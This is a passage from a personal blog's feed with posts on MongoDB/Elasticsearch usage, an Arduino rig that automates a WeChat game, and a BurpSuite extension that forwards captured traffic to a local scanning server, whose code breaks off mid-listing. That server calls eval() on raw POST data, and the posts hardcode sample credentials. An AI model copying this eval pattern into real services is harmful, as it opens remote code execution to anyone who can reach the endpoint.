    <content type="html"><![CDATA[<h2 id="Store-Data-in-MongoDB"><a href="#Store-Data-in-MongoDB" class="headerlink" title="Store Data in MongoDB"></a>Store Data in MongoDB</h2><p>To store data in MongoDB database, I use the python module pymongo as shown below:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line">client = pymongo.MongoClient(<span class="string">"mongodb://%s:%s@127.0.0.1"</span> % (<span class="string">'user'</span>, <span class="string">'password'</span>), port=<span class="number">22222</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mongodbexec</span><span class="params">(name, contact, groupnumber, groupname, timeStamp, card, nick)</span>:</span></span><br><span class="line">    member = &#123;</span><br><span class="line">        <span class="string">'groupcard'</span>: card,</span><br><span class="line">        <span class="string">'groupnumber'</span>: groupnumber,</span><br><span class="line">        <span class="string">'groupname'</span>: groupname,</span><br><span class="line">        <span class="string">'contact'</span>: contact,</span><br><span class="line">        <span class="string">'nickname'</span>: nick,</span><br><span class="line">        <span class="string">'qqage'</span>: memberindex[name][<span class="number">1</span>],</span><br><span class="line">        <span class="string">'qq'</span>: memberindex[name][<span class="number">2</span>],</span><br><span class="line">        <span class="string">'timestamp'</span>: timeStamp,</span><br><span class="line">    &#125;</span><br><span class="line">    QQres.insert_one(member)</span><br></pre></td></tr></table></figure><p>And for security, adding an auth process is necessary. In mongo console:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use admin //switch to admin database</span><br><span class="line">db.createUser(&#123;user:'root', pwd: 'password', roles: ['root']&#125;) //create an administrator</span><br></pre></td></tr></table></figure><p>If you want to change your user’s password later, you can use the changeUserPassword command:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.changeUserPassword('root','password1')</span><br></pre></td></tr></table></figure><p>Then you should start mongod with argument ‘–auth’:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --port 27017 --dbpath /data/db1 --auth</span><br></pre></td></tr></table></figure><p>If you want to login into mongo console, you must provide your username and password like this:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo admin -u root -p password</span><br></pre></td></tr></table></figure><p>Export data to csv(<a href="https://docs.mongodb.com/manual/reference/program/mongoexport/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/program/mongoexport/</a>):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongoexport --username xxx --password xxx --authenticationDatabase admin --db xxx --collection xxx --type csv --fields xxx,xxx --out .../output.csv</span><br></pre></td></tr></table></figure><h2 id="Export-MongoDB-Database-Into-Elasticsearch"><a href="#Export-MongoDB-Database-Into-Elasticsearch" class="headerlink" title="Export MongoDB Database Into Elasticsearch"></a>Export MongoDB Database Into Elasticsearch</h2><p>There are some useful tools to finish this job such as mongo-connector, transporter, etc. But I met some problems when I use mongo-connector and I speculate it’s the incompatibility of versions between mongo-connector and Elasticsearch. So I chose transporter which is an open source and high-efficiency tool built with go.</p><p>It’s easy to build and configure. More details: <a href="https://github.com/compose/transporter" target="_blank" rel="noopener">https://github.com/compose/transporter</a>.</p><p>When building finished, the first thing is to initialize the transporter:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transporter init mongodb elasticsearch</span><br></pre></td></tr></table></figure><p>This step will generate a file pipeline.js under the directory of cmd/transporter, open and modify the file:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> source = mongodb(&#123;</span><br><span class="line">  <span class="string">"uri"</span>: <span class="string">"mongodb://127.0.0.1:22222/database"</span></span><br><span class="line">  <span class="comment">// "timeout": "30s",</span></span><br><span class="line">  <span class="comment">// "tail": false,</span></span><br><span class="line">  <span class="comment">// "ssl": false,</span></span><br><span class="line">  <span class="comment">// "cacerts": ["/path/to/cert.pem"],</span></span><br><span class="line">  <span class="comment">// "wc": 1,</span></span><br><span class="line">  <span class="comment">// "fsync": false,</span></span><br><span class="line">  <span class="comment">// "bulk": false,</span></span><br><span class="line">  <span class="comment">// "collection_filters": "&#123;&#125;",</span></span><br><span class="line">  <span class="comment">// "read_preference": "Primary"</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sink = elasticsearch(&#123;</span><br><span class="line">  <span class="string">"uri"</span>: <span class="string">"http://elastic:password@localhost:9200/database"</span></span><br><span class="line">  <span class="comment">// "timeout": "10s", // defaults to 30s</span></span><br><span class="line">  <span class="comment">// "aws_access_key": "ABCDEF", // used for signing requests to AWS Elasticsearch service</span></span><br><span class="line">  <span class="comment">// "aws_access_secret": "ABCDEF" // used for signing requests to AWS Elasticsearch service</span></span><br><span class="line">  <span class="comment">// "parent_id": "elastic_parent" // defaults to "elastic_parent" parent identifier for Elasticsearch</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">t.Source(<span class="string">"source"</span>, source, <span class="string">"/.*/"</span>).Save(<span class="string">"sink"</span>, sink, <span class="string">"/.*/"</span>)</span><br></pre></td></tr></table></figure><p>Finally run the transporter to transfer the database from MongoDB to Elasticsearch.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transporter run</span><br></pre></td></tr></table></figure><h2 id="Retrieve-Keywords-With-Elasticsearch"><a href="#Retrieve-Keywords-With-Elasticsearch" class="headerlink" title="Retrieve Keywords With Elasticsearch"></a>Retrieve Keywords With Elasticsearch</h2><p>Reading the docs to learn about the usage of Elasticsearch: <a href="https://www.elastic.co/guide/index.html" target="_blank" rel="noopener">https://www.elastic.co/guide/index.html</a>.</p>]]></content>
    
    <summary type="html">
    
      The purpose of this post is to write down the common usage of MongoDB in my daily work. In addition, some manipulations for Elasticsearch are useful in certain circumstances.
    
    </summary>
    
    
      <category term="Python" scheme="https://recursively.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://recursively.github.io/tags/Python/"/>
    
      <category term="Mongodb" scheme="https://recursively.github.io/tags/Mongodb/"/>
    
      <category term="Elasticsearch" scheme="https://recursively.github.io/tags/Elasticsearch/"/>
    
  </entry>
  
  <entry>
    <title>Tricks for Wechat Tiaoyitiao Mini Program</title>
    <link href="https://recursively.github.io/2018/05/11/Tricks-for-Wechat-Tiaoyitiao-Mini-Program/"/>
    <id>https://recursively.github.io/2018/05/11/Tricks-for-Wechat-Tiaoyitiao-Mini-Program/</id>
    <published>2018-05-11T16:32:36.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="How-does-it-act"><a href="#How-does-it-act" class="headerlink" title="How does it act?"></a>How does it act?</h2><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/IMG_2723.GIF" alt></p><h2 id="Distinguish-the-Screenshot"><a href="#Distinguish-the-Screenshot" class="headerlink" title="Distinguish the Screenshot"></a>Distinguish the Screenshot</h2><p>First of all, we need to work out the program to distinguish the chess piece and board, furthermore, finding the distance between the chess piece and the target position and calculating the pressing time. It’s definitely a complicated process. I used the open-source project <a href="https://github.com/wangshub/wechat_jump_game" target="_blank" rel="noopener">https://github.com/wangshub/wechat_jump_game</a>. We should connect the mobile phone to the computer with USB and make sure that we have installed android adb debug command so that the mobile phone can take screenshots via the program for the next manipulation.</p><h2 id="Control-the-Servo-With-Arduino"><a href="#Control-the-Servo-With-Arduino" class="headerlink" title="Control the Servo With Arduino"></a>Control the Servo With Arduino</h2><p>I wrote the C program with Arduino IDE, the Arduino serial only accepts string type input, for convenience I use the char_to_int(char i) function to transform the input type. The servo moves to an angle decided by the .write(angle) method, the parameter angle can be different in other situations. The delay time is associated with pressing time based on the distance between the target position and chess piece.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Servo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">Servo myservo;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">char_to_int</span><span class="params">(<span class="keyword">char</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'0'</span>:<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'1'</span>:<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'2'</span>:<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'3'</span>:<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'4'</span>:<span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'5'</span>:<span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'6'</span>:<span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'7'</span>:<span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'8'</span>:<span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'9'</span>:<span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">default</span>:<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Serial.begin(<span class="number">9600</span>);</span><br><span class="line">    pinMode(<span class="number">10</span>, OUTPUT);</span><br><span class="line">    myservo.attach(<span class="number">10</span>);</span><br><span class="line">    myservo.write(<span class="number">0</span>);</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a, b, c;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">while</span>(!Serial.available());</span><br><span class="line">    <span class="keyword">if</span>(Serial.available())</span><br><span class="line">    &#123;</span><br><span class="line">        a = Serial.read();</span><br><span class="line">        delay(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Serial.available())</span><br><span class="line">    &#123;</span><br><span class="line">        b = Serial.read();</span><br><span class="line">        delay(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Serial.available())</span><br><span class="line">    &#123;</span><br><span class="line">        c = Serial.read();</span><br><span class="line">        delay(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i = char_to_int(a);</span><br><span class="line">        Serial.println(i, DEC);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i = char_to_int(a) * <span class="number">10</span> + char_to_int(b);</span><br><span class="line">        Serial.println(i, DEC);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        i = char_to_int(a) * <span class="number">100</span> + char_to_int(b) * <span class="number">10</span> + char_to_int(c);</span><br><span class="line">        Serial.println(i, DEC);</span><br><span class="line">    &#125;</span><br><span class="line">    i = i*<span class="number">23</span>;</span><br><span class="line"></span><br><span class="line">    myservo.write(<span class="number">60</span>);</span><br><span class="line">    delay(i);</span><br><span class="line"></span><br><span class="line">    myservo.write(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Control-the-Arduino-Serial"><a href="#Control-the-Arduino-Serial" class="headerlink" title="Control the Arduino Serial"></a>Control the Arduino Serial</h2><p>In order to control the Arduino serial input value, we can use the serial monitor embedded in the Arduino IDE. And we can also use python to Implement the same functionality.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="comment">#coding=utf-8  </span></span><br><span class="line"><span class="keyword">import</span> serial </span><br><span class="line"><span class="comment">#from serial import * </span></span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> threading  </span><br><span class="line"><span class="keyword">import</span> glob  </span><br><span class="line">  </span><br><span class="line">inhead = <span class="string">'RECV'</span>      </span><br><span class="line">outhead = <span class="string">'SEND'</span>     </span><br><span class="line">      </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerialData</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span>  </span><br><span class="line">        threading.Thread.__init__(self)     </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_com</span><span class="params">(self, port, baud)</span>:</span>         </span><br><span class="line">        self.ser = serial.Serial(port, baud, timeout = <span class="number">0.5</span>)  </span><br><span class="line">        <span class="keyword">return</span> self.ser  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">com_isopen</span><span class="params">(self)</span>:</span>                       </span><br><span class="line">        <span class="keyword">return</span> self.ser.isOpen()  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(self, data, outhead = outhead)</span>:</span>   </span><br><span class="line">        self.ser.write(outhead + data)    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span>                                      </span><br><span class="line">        all_data = <span class="string">''</span>                             </span><br><span class="line">        <span class="comment">#if inhead == self.ser.read(1) :  </span></span><br><span class="line">        all_data =  self.ser.readline()     </span><br><span class="line">        <span class="keyword">return</span>  all_data  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_listen_com</span><span class="params">(self)</span>:</span>                 </span><br><span class="line">        <span class="keyword">return</span> self.ser.close()  </span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        rec_data = SerialData()                 </span><br><span class="line">        allport = glob.glob(<span class="string">'/dev/ttyACM*'</span>)  </span><br><span class="line">        port = allport[<span class="number">0</span>]                             </span><br><span class="line">        baud = <span class="number">9600</span>    </span><br><span class="line">        openflag = rec_data.open_com(port, baud) </span><br><span class="line">        <span class="keyword">if</span> openflag:  </span><br><span class="line">            <span class="keyword">print</span> <span class="string">'i open %s at %s successfully!'</span>%(allport[<span class="number">0</span>], baud)  </span><br><span class="line">        rec_data.send_data(<span class="string">'90'</span>)</span><br><span class="line">       </span><br><span class="line">        rec_data.close_listen_com()</span><br><span class="line">          </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:             </span><br><span class="line">        rec_data.close_listen_com()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> rec_data.com_isopen():</span><br><span class="line">            print(<span class="string">'serial closed'</span>)</span><br></pre></td></tr></table></figure><h2 id="Combine-the-Codes"><a href="#Combine-the-Codes" class="headerlink" title="Combine the Codes"></a>Combine the Codes</h2><p>The last step is combining the picture distinguishing code and the serial controlling code. I’ve run the code with python3.6 and the whole process performed well.</p>]]></content>
    
    <summary type="html">
    
      There are too many tricks for Wechat &quot;Tiaoyitiao&quot; mini program. Here I give a method to play the game automatically. Different from the older software proposal, I added the Arduino module to imitate the behaviors of the human.
    
    </summary>
    
    
      <category term="Python" scheme="https://recursively.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://recursively.github.io/tags/Python/"/>
    
      <category term="Arduino" scheme="https://recursively.github.io/tags/Arduino/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite Jython Extension for Passive Scanner</title>
    <link href="https://recursively.github.io/2018/05/08/BurpSuite-Jython-extension-for-passive-scanner/"/>
    <id>https://recursively.github.io/2018/05/08/BurpSuite-Jython-extension-for-passive-scanner/</id>
    <published>2018-05-08T19:01:10.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BurpSuite-Jython-Extension"><a href="#BurpSuite-Jython-Extension" class="headerlink" title="BurpSuite Jython Extension"></a>BurpSuite Jython Extension</h2><p>In order to glean the vulnerability detection information and avoid scanning the massive useless URLs of the websites, I prefer using passive scanner during my daily work.</p><p>I’d like to use BurpSuite to analyze URLs and store them in the database for the next passive scanning process via socket tunnel. But here comes the problem, BurpSuite cannot transfer https flow to another place, so I wrote a simple Jython script as the disposal.</p><p>Tutorial about writing a Jython extension can be found everywhere. Here I put the main code </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">processHttpMessage</span><span class="params">(self, toolFlag, messageIsRequest, messageInfo)</span>:</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># only process requests</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">        </span><br><span class="line">            <span class="comment"># create a new log entry with the message details</span></span><br><span class="line">            self._lock.acquire()</span><br><span class="line">            row = self._log.size()</span><br><span class="line">            req = self._helpers.analyzeRequest(messageInfo)</span><br><span class="line">            LE = LogEntry(toolFlag, self._callbacks.saveBuffersToTempFiles(messageInfo), req.getUrl())</span><br><span class="line">            self._log.add(LE)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                params = req.getParameters()</span><br><span class="line">                pas = []</span><br><span class="line">                pnames = []</span><br><span class="line">                <span class="keyword">for</span> pa <span class="keyword">in</span> params:</span><br><span class="line">                    pnames.append(pa.getName())</span><br><span class="line">                    pas.append(pa.getName()+<span class="string">"="</span>+pa.getValue())</span><br><span class="line">                <span class="comment">#pas = pas.join('&amp;')</span></span><br><span class="line">                </span><br><span class="line">                values = &#123;<span class="string">"docs"</span>:[&#123;<span class="string">"TIME"</span>:time.time(),<span class="string">"URL"</span>:LE._url.toString(),<span class="string">"PNames"</span>:<span class="string">'&amp;'</span>.join(pnames),<span class="string">"Method"</span>:req.getMethod(),<span class="string">"HOST"</span>:LE._url.getHost(),<span class="string">"PATH"</span>:LE._url.getPath(),<span class="string">"PARAM"</span>:<span class="string">'&amp;'</span>.join(pas),<span class="string">"REQ"</span>:LE._requestResponse.getRequest().tostring(),<span class="string">"RESP"</span>:LE._requestResponse.getResponse().tostring(),<span class="string">"USER"</span>:<span class="string">"test"</span>&#125;]&#125;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#data = 'docs=[&#123;"URL":"'+LE._url.toString()+'","REQ":"'+urllib.quote(LE._requestResponse.getRequest().tostring())+'","RESP":"'+urllib.quote(LE._requestResponse.getResponse().tostring())+'"&#125;]'</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># data = "docs="+urllib.quote(json.dumps(values['docs'], sort_keys=True))</span></span><br><span class="line">                send_data = &#123;&#125;</span><br><span class="line">                req_url = LE._url.toString()</span><br><span class="line">                req_headers, req_body = split_req(LE._requestResponse.getRequest().tostring())</span><br><span class="line">                o = urlparse(req_url)</span><br><span class="line">                req_host = o.netloc</span><br><span class="line">                req_headers[<span class="string">'Host'</span>] = req_host</span><br><span class="line">                req_method = req.getMethod()</span><br><span class="line">                data = extract_request(req_url, req_headers, req_method, req_body)</span><br><span class="line">                send_data[<span class="string">'req_url'</span>] = req_url</span><br><span class="line">                send_data[<span class="string">'req_headers'</span>], send_data[<span class="string">'req_body'</span>] = req_headers, req_body</span><br><span class="line">                send_data[<span class="string">'req_host'</span>] = req_host</span><br><span class="line">                send_data[<span class="string">'req_method'</span>] = req_method</span><br><span class="line">                send_data[<span class="string">'data'</span>] = data</span><br><span class="line">                print(send_data)</span><br><span class="line"></span><br><span class="line">                target_url = <span class="string">"http://192.168.10.57:8888"</span></span><br><span class="line">                res = urllib2.Request(target_url, str(send_data))</span><br><span class="line">                threading.Thread(target=urllib2.urlopen, args=(res,)).start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            self.fireTableRowsInserted(row, row)</span><br><span class="line">            self._lock.release()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_request</span><span class="params">(url, headers, method, body)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = re.search(<span class="string">'://.*?/(.*)'</span>, url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    url = (<span class="string">'/'</span> + a.group(<span class="number">1</span>)) <span class="keyword">if</span> a <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">'/'</span></span><br><span class="line">    requests = <span class="string">"%s %s\r\n"</span> % (method, url)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> headers.items():</span><br><span class="line">        requests += <span class="string">"%s: %s\r\n"</span> % (key, value)</span><br><span class="line">    requests += <span class="string">"\r\n%s"</span> % body</span><br><span class="line">    <span class="keyword">return</span> requests</span><br></pre></td></tr></table></figure><p>the function extract_request(url, headers, method, body) is used to transform requests and the processHttpMessage(self, toolFlag, messageIsRequest, messageInfo) function is used to send the BurpSuite URLs to another server which is started locally. Sure, there’s no need to do such complicated work, but I can’t find some modules(redis) I need in Jython, maybe you have better ideas I don’t know…Start a server</p><p>I put my server code below:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> lib.redisopt <span class="keyword">import</span> content_deal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_set_response</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.wfile.write(<span class="string">"GET request for &#123;&#125;"</span>.format(self.headers).encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span><span class="params">(self)</span>:</span></span><br><span class="line">        content_length = int(self.headers[<span class="string">'Content-Length'</span>]) <span class="comment"># &lt;--- Gets the size of data</span></span><br><span class="line">        post_data = self.rfile.read(content_length) <span class="comment"># &lt;--- Gets the data itself</span></span><br><span class="line">        receive_data = eval(post_data.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">        req_url = receive_data[<span class="string">'req_url'</span>]</span><br><span class="line">        req_headers, req_body = receive_data[<span class="string">'req_headers'</span>], receive_data[<span class="string">'req_body'</span>]</span><br><span class="line">        req_host = receive_data[<span 